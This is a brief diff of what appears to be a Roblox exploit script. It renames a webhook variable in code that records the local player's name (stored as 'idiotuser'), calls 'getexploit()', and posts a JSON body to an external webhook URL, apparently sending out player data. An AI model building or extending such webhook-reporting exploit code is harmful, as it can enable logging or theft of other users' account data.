@@ -72,7 +72,7 @@ end
 getexploit()
 local dhid
 local idiotuser = game:GetService("Players").LocalPlayer.Name
-local url = _G.Webhook
+local url = Webhook
 if _G.UserID == nil then
     game:GetService("Players").LocalPlayer:Kick("Put A UserId")
     return;
@@ -1360,7 +1360,7 @@ local headers = {
     ["content-type"] = "application/json"
 }
 
-if _G.Webhook ~= nil then
+if Webhook ~= nil then
     local abcdef1 = {
         Url = url,
         Body = newdata1,
